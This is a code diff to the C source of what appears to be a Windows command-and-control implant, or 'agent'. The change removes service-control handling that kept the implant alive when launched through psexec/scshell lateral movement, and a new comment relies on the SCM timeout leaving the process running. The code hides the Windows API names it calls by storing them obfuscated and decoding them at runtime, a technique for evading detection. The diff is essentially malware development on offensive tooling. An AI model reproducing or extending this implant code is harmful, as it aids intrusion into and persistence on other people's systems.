@@ -791,37 +791,7 @@ void agent_run(AgentState *state) {
     }
 }
 
-/* ─── Service mode support ───
- * When launched via SCM (psexec/scshell lateral movement), we must register
- * as a proper service or SCM will kill our process. The agent tries
- * StartServiceCtrlDispatcherW first — if it fails with 1063
- * (ERROR_FAILED_SERVICE_CONTROLLER_CONNECT), we're running standalone.
- */
-
-/* Function pointer typedefs for service APIs (resolved dynamically) */
-typedef SERVICE_STATUS_HANDLE (WINAPI *fn_RegisterServiceCtrlHandlerW)(LPCWSTR, LPHANDLER_FUNCTION);
-typedef BOOL (WINAPI *fn_SetServiceStatus)(SERVICE_STATUS_HANDLE, LPSERVICE_STATUS);
-typedef BOOL (WINAPI *fn_StartServiceCtrlDispatcherW)(const SERVICE_TABLE_ENTRYW *);
-
-/* Globals for service mode — accessible from ServiceMain thread */
-static fn_RegisterServiceCtrlHandlerW g_pRegisterSvcCtrlHandler = NULL;
-static fn_SetServiceStatus            g_pSetServiceStatus       = NULL;
-static SERVICE_STATUS_HANDLE           g_svcStatusHandle         = NULL;
-static AgentState                      g_svc_state;
-
-static void WINAPI _svc_ctrl_handler(DWORD dwControl) {
-    if (dwControl == SERVICE_CONTROL_STOP ||
-        dwControl == SERVICE_CONTROL_SHUTDOWN) {
-        g_svc_state.running = FALSE;
-        SERVICE_STATUS ss = {0};
-        ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
-        ss.dwCurrentState = SERVICE_STOP_PENDING;
-        ss.dwWaitHint = 10000;
-        g_pSetServiceStatus(g_svcStatusHandle, &ss);
-    }
-}
-
-/* Runs the full agent lifecycle — used by both service and standalone paths */
+/* Runs the full agent lifecycle */
 static int _agent_run_full(AgentState *state) {
     if (!agent_init(state)) {
         DBG("[main] agent_init FAILED — exiting");
@@ -850,74 +820,6 @@ static int _agent_run_full(AgentState *state) {
     channel_cleanup_all();
     crypto_cleanup();
     return 0;
-}
-
-static void WINAPI _svc_main(DWORD dwArgc, LPWSTR *lpszArgv) {
-    (void)dwArgc; (void)lpszArgv;
-
-    /* Register control handler — empty name = SCM uses the registered service name */
-    g_svcStatusHandle = g_pRegisterSvcCtrlHandler(L"", _svc_ctrl_handler);
-    if (!g_svcStatusHandle) {
-        DBG("[svc] RegisterServiceCtrlHandlerW FAILED (err=%u)", GetLastError());
-        return;
-    }
-
-    /* Tell SCM we're running — this prevents SCM from killing us */
-    SERVICE_STATUS ss = {0};
-    ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
-    ss.dwCurrentState = SERVICE_RUNNING;
-    ss.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
-    g_pSetServiceStatus(g_svcStatusHandle, &ss);
-
-    DBG("[svc] service mode: reported SERVICE_RUNNING to SCM");
-
-    /* Run agent normally */
-    _agent_run_full(&g_svc_state);
-
-    /* Report stopped */
-    ss.dwCurrentState = SERVICE_STOPPED;
-    ss.dwControlsAccepted = 0;
-    g_pSetServiceStatus(g_svcStatusHandle, &ss);
-}
-
-/* Try to dispatch as a Windows service. Returns TRUE if we ran as a service. */
-static BOOL _try_service_dispatch(void) {
-    /* Resolve service APIs from advapi32.dll */
-    char _adv[] = S_ADVAPI32_DLL; _DEOBF(_adv);
-    HMODULE hAdv = LoadLibraryA(_adv);
-    if (!hAdv) return FALSE;
-
-    char _s1[] = S_StartServiceCtrlDispatcherW; _DEOBF(_s1);
-    char _s2[] = S_RegisterServiceCtrlHandlerW; _DEOBF(_s2);
-    char _s3[] = S_SetServiceStatus_S; _DEOBF(_s3);
-
-    fn_StartServiceCtrlDispatcherW pStart =
-        (fn_StartServiceCtrlDispatcherW)GetProcAddress(hAdv, _s1);
-    g_pRegisterSvcCtrlHandler =
-        (fn_RegisterServiceCtrlHandlerW)GetProcAddress(hAdv, _s2);
-    g_pSetServiceStatus =
-        (fn_SetServiceStatus)GetProcAddress(hAdv, _s3);
-
-    if (!pStart || !g_pRegisterSvcCtrlHandler || !g_pSetServiceStatus)
-        return FALSE;
-
-    /* Try to connect to SCM. This blocks if we're a service (calls _svc_main).
-     * If we're NOT a service, it fails immediately with error 1063. */
-    SERVICE_TABLE_ENTRYW dispatchTable[] = {
-        { L"", _svc_main },
-        { NULL, NULL }
-    };
-
-    DBG("[svc] attempting StartServiceCtrlDispatcherW...");
-    if (pStart(dispatchTable)) {
-        DBG("[svc] service dispatch completed");
-        return TRUE;  /* Ran as service, _svc_main already finished */
-    }
-
-    DWORD err = GetLastError();
-    DBG("[svc] StartServiceCtrlDispatcherW failed (err=%u) — standalone mode", err);
-    /* Error 1063 = ERROR_FAILED_SERVICE_CONTROLLER_CONNECT = not started by SCM */
-    return FALSE;
 }
 
 /* ─── Entry point ─── */
@@ -986,15 +888,9 @@ int main(void) {
 
     DBG("[main] agent starting, PID=%u", GetCurrentProcessId());
 
-    /* ── Service mode check ──
-     * If we were launched by SCM (psexec/scshell), StartServiceCtrlDispatcherW
-     * will block and call _svc_main on a worker thread, which runs the full
-     * agent lifecycle. If we're standalone, it fails with 1063 and we continue. */
-    if (_try_service_dispatch()) {
-        DBG("[main] ran as service, exiting cleanly");
-        return 0;
-    }
-    DBG("[main] standalone mode, proceeding with normal init");
+    /* No service registration — when launched by SCM (scshell/psexec), the process
+     * runs standalone. SCM will timeout with error 1053 and mark the service as failed,
+     * but the process keeps running. This matches the Adaptix scshell approach. */
 
     return _agent_run_full(&state);
 }
